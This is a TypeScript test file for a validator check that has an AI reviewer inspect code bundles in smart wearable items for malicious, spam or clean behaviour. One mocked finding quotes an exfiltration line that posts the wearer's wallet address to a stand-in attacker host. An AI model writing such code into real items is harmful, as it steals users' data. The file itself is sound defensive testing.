import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { validate } from "../../../validate.js";
import { manifest } from "../../../manifest/index.js";
import type { Reviewer, ReviewRequest, ReviewResult } from "../../../types.js";
import { syntheticZip } from "#test/helpers/synthetic.js";
import { enc } from "#test/helpers/bytes.js";

const CHECK = { checks: ["smart-wearable-code"] };
const SCENE = enc(JSON.stringify({ main: "bin/game.js", requiredPermissions: [] }));
const BUNDLE = enc('"use strict";var dance=()=>playSound("sounds/beat.mp3");');

// both body shapes ship the same scene, as the Builder stores them
const smart = (bundle = BUNDLE) =>
  syntheticZip({ extraFiles: { "male/scene.json": SCENE, "male/bin/game.js": bundle, "female/scene.json": SCENE, "female/bin/game.js": bundle } });

function reviewer(answer: (request: ReviewRequest) => unknown) {
  const reviews: ReviewRequest[] = [];
  const review: Reviewer["review"] = async (request): Promise<ReviewResult> => {
    reviews.push(request);
    return { ok: true, answer: answer(request), metadata: { provider: "test", model: "fixture", promptDigest: request.promptDigest, promptVersion: request.prompt.version } };
  };
  return { services: { reviewer: { review } }, reviews };
}

describe("smart-wearable-code (S-12)", () => {
  it("reads the scene and its bundle once as text, with its own budget, and passes clean code with what it does", async () => {
    const mock = reviewer(() => ({ verdict: "ok", summary: "Plays a beat when the player dances.", findings: [] }));
    const result = await validate(await smart(), { ...CHECK, services: mock.services });
    assert.deepEqual([result.checks[0].status, result.checks[0].measured], ["passed", "Plays a beat when the player dances."]);
    const [request] = mock.reviews;
    assert.deepEqual(request.texts?.map((text) => text.id), ["male/scene.json", "male/bin/game.js"], "the female copies are the same bytes");
    assert.equal(request.texts?.[1].text, new TextDecoder().decode(BUNDLE));
    assert.deepEqual([request.images.length, request.maxInputTokens], [0, manifest.smartWearableCode.maxInputTokens]);
  });

  it("fails the item on malicious code, naming the file and the code that shows it", async () => {
    const mock = reviewer(() => ({
      verdict: "malicious",
      summary: "Sends the wearer's wallet address to an outside server.",
      findings: [{ kind: "malicious", message: "It posts the player's address to evil.example.", fileId: "male/bin/game.js", excerpt: 'fetch("https://evil.example",{body:address})' }]
    }));
    const result = await validate(await smart(), { ...CHECK, services: mock.services });
    assert.equal(result.checks[0].status, "failed");
    assert.deepEqual([result.findings[0].severity, result.findings[0].where], ["error", "male/bin/game.js"]);
    assert.match(result.findings[0].message, /^Malicious code: It posts the player's address/);
  });

  it("gives no verdict when it cannot tell, when the model cites a file it was not given, or when the code is too large to send", async () => {
    const inconclusive = reviewer(() => ({ verdict: "inconclusive", summary: "The bundle decodes a payload it never shows.", findings: [] }));
    assert.equal((await validate(await smart(), { ...CHECK, services: inconclusive.services })).checks[0].status, "errored");
    const invented = reviewer(() => ({ verdict: "spam", summary: "Ads.", findings: [{ kind: "spam", message: "Shows ads.", fileId: "other.js", excerpt: "ad()" }] }));
    assert.equal((await validate(await smart(), { ...CHECK, services: invented.services })).checks[0].status, "errored");
    const huge = reviewer(() => ({ verdict: "ok", summary: "-", findings: [] }));
    const result = await validate(await smart(new Uint8Array(manifest.smartWearableCode.maxCodeBytes + 1).fill(32)), { ...CHECK, services: huge.services });
    assert.equal(result.checks[0].status, "errored");
    assert.equal(huge.reviews.length, 0, "a bundle over the cap is never sent");
  });

  it("is not applicable to a wearable without a scene", async () => {
    const result = await validate(await syntheticZip(), CHECK);
    assert.equal(result.checks.length, 0);
  });
});
